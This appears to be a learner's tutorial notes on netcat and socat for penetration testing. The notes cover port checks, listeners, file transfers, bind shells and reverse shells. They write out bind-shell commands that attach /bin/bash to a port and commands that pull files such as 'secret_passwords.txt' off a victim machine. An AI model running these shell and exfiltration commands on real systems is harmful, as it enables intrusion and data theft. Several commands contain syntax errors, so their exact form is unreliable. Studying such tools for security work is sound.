# Netcat - The Swiss Army Knife of Network Connections

Definition of what netcat does: A utility which reads and writes data across network connections using TCP or UDP protocols

### Connecting to a TCP or UDP Port

Netcat is an incredible tool used by penetration testers largely because of its ease of use, combined with it's ability to open shells or reverse shells to target machines. 

The tool also allows us to:
1. Connect to a network service manually
2. Check if a port is open
3. Determine the versioning of a service by grabbing its banner

To run a netcat command against a remote host,. all that is needed is:
1. The IP of the machine you are testing
2. The port on which you want to test
3. (Optional) Flags that can be passed to netcat for various additional functionalities. 

An Example:

```bash
nc <ip address> <port>

nc 10.10.10.10 22
```

Some additional information on what netcat can do can be found here:
- https://www.varonis.com/blog/netcat-commands
- https://www.ionos.com/digitalguide/server/tools/netcat/

### LISTENING on a TCP/ UDP Port

One great thing about netcat is that the tool allows you to run netcat as a SERVER (listening for a connection) or a CLIENT (Trying to connect to a remote host). 

In penetration testing, it is common to try to get a remote machine to connect BACK to the machine you are working from. This is because there are often INGRESS firewall rules (Ingress= information coming into a system, EGRESS= Information going OUT of a system) in place that say "Disallow any incoming connections" BUT firewalls typically have no issue with allowing OUTGOING connections as computers are obviously being used to retrieve information from out on the web. 

This makes netcat a handy tool for tricking a user or a program on a computer to send a netcat connection to your machine, where you have set up a netcat listener to open a command shell (if this doesn't make sense, keep reading. It will eventually make sense).

To listen on your local machine with netcat we can run the following (pay attent to the -l flag as that is the flag that tells the computer to listen on a specific port)

```bash
nc -lnvp 4444
```
In this instance the flags each have their own meaning:

- -n : Disable DNS resolution (aka use an IP address as an address instead of a domain name)
- -l : Listen
- -v : Verbose output
- -p : Local port to listen on

In this case the local machine is now listening for connections on port 4444. 

### Transferring files with Netcat

One cool additional functionality of netcat is that we can transfer files with it. 

An example to try out if you have two machines:

1. Run this on your local machine
```bash
nc -nlvp 4444 > bringit.txt
```
2. Run this on your remote machine:
```bash
nc -nv <IP of local machine> 4444 < <filename>
```

At the end of this the file you chose should have transeferred to your local machine. Depending on the sizr, it might take a while. but this is a good technique to use when trying to pull information down from a remote machine that happens to have netcat installed. 

## Remote Admin with Netcat (And Bind Shells)

Netcat has one particular feature that is EXTREMELY useful in a penetration test which is the utilization of the “-e” flag.

The -e flag is used to execute a program AFTER making or receiving a successful connection.

Be aware that this flag is not always available as it is something that can be easily abused by an attacker.

Kali linux will support this flag by default, but if it happens to be available on a remote server you are testing, do not expect to find the same functionality.

So maybe I’ve jumped too far ahead and haven’t explained WHY this is so dangerous. Let’s get an example going:

Consider the cmd.exe executable. Let’s say we ran this command on a remote host:

```bash

Nc -lnvp 4444 -e /bin/bash

```

Wat this is doing is opening a port for connection on port 4444 and so if someone were to send a command to that port like this:

```bash
Nc -nv <remote IP> 4444
```

The person would connect and then immediately be provided a bash shell. At this point, the person who has attached to this port has a shell. AKA you just learned what a bind shell is.

## Reverse Shells

So one thing that turned me around when I was first learning was understanding the difference between a BIND SHELL and a REVERSE SHELL.

Bind Shell: A remote machine (A victim computer or server) is listening on a port that when bound, gives the remote user a shell.
Reverse Shell: You (The attacker) opens a port on your local machine for connection. The attacker then finds a way to make the victm (ie a remote machine) to connect back to your machine. Upon connection, you (the attacker) receive a shell where you can now access the remote machine.

## Socat

Resources to Review:
1. https://medium.com/@paxprajapati/preferring-socat-over-netcat-785fc590a050#:~:text=socat%20can%20make%20you%20communicate,TCP%2C%20TUN%2C%20UDP%2C%20%E2%80%A6
2. https://www.rubyguides.com/2012/07/socat-cheatsheet/

"What makes socat so versatile is the fact that an address can represent a network socket, any file descriptor, a Unix domain datagram or stream socket, TCP and UDP (over both IPv4 and IPv6), SOCKS 4/4a over IPv4/IPv6, SCTP, PTY, datagram and stream sockets, named and unnamed pipes, raw IP sockets, OpenSSL, or on Linux even any arbitrary network device."

Important socat terminology:

1. Addresses: An IP Address the user provides via the command line. 

Socat is a very similar command to netcat but it has added functionalioty and can communicate over a wide variety of protocols. 

How it is similar:

See how you connect with netcat:

```bash
nc <ip address> 443
```

And socat:

```bash
socat - TCP$:<ip address>:443
```

In socat the protocol, options and port number are separated with a comma. 

Apparently root privielges are required to bind on a port below 1024. I did not know this until now but keep that in mind. 

So if you want to open a LISTENER with nc and socat they would look like this:

```bash
sudo nc -lnvp <ip> 80
```

or socat 

```bash
sudo socat TCP4-LISTEN:443 STDOUT
```

Here is another example:

```bash
nc -lp 700 -e /bin/bash
```
It's socat equivalent:

```bash
socat TCP4:LISTEN:700 EXEC:/bin/bash
```


You need to indicate the STDOUT because that is how socat will relay what is being piped to your machine from another machine. 

### Socat File Transfers

Socat is also capable of transferring files just like nc. 

Below are two commands that can be used to transfer a file from one machine to another.

Command # 1 is used to designate which file on a remote machine you would like to transfer. The command sets up a listener on port 443 (like an https serbver) and then specifies the filename of the file to be transferred when connected to (secret_passwords.txt)

1. (Remember this is run on the target/victim machine)
```bash
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```
Command #2 is used here to connect to the machine that ran command #1, and create file "received_secret_passwords.txt"
 
2. 
```bash
socat TCP4:<remote machine>:443 file:received_secret_passwords.txt,create
```


